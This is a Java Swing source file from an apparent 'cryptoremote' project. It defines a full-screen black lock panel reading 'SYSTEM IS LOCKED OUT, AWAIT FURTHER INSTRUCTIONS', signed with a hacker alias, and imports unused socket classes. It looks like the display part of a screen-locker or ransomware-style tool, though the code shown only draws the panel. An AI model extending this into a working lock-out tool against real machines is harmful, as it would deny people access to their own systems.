package com.sacredcoder.cryptoremote;

import java.awt.*;
import java.awt.event.*;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import javax.swing.*;
import javax.swing.event.*;
import javax.tools.Tool;

import static java.awt.AWTEvent.WINDOW_EVENT_MASK;
import static java.awt.event.InputEvent.CTRL_DOWN_MASK;
import static java.awt.event.InputEvent.SHIFT_DOWN_MASK;
import static java.awt.event.KeyEvent.VK_D;
import static java.awt.event.KeyEvent.VK_U;
import static java.awt.event.KeyEvent.VK_WINDOWS;
import static javax.swing.JOptionPane.showMessageDialog;
import static javax.swing.KeyStroke.getKeyStroke;

public class lockGuiPanel extends JPanel {
    private JLabel info;
    private JLabel info2;

private JButton b;

ServerSocket serverSocket;
Socket socket;
    public lockGuiPanel() {
       info = new JLabel ();
        info2 = new JLabel ("SYSTEM IS LOCKED OUT, AWAIT FURTHER INSTRUCTIONS ~ SAKET UPADHYAY (0V3R L0RD)");
        b= new JButton();

        //adjust size and set layout
        setPreferredSize (Toolkit.getDefaultToolkit().getScreenSize());
        setLayout (null);
        add (info);
        add (info2);
        add(b);

        info.setLocation(0,0);

        //set component bounds (only needed by Absolute Positioning)
        info.setSize(141,152);
        info2.setLocation(143,0);

        //set component bounds (only needed by Absolute Positioning)
        info2.setSize(600,141);
        info.setIcon(new ImageIcon("data\\icon.png"));
        setFocusable(true);
        info2.setForeground(Color.WHITE);
setBackground(Color.BLACK);

if(!isFocusOwner()){requestFocus();}

    }

    public void war()
    {
        info.setText("WARNING MESSAGE !!");
    }



}
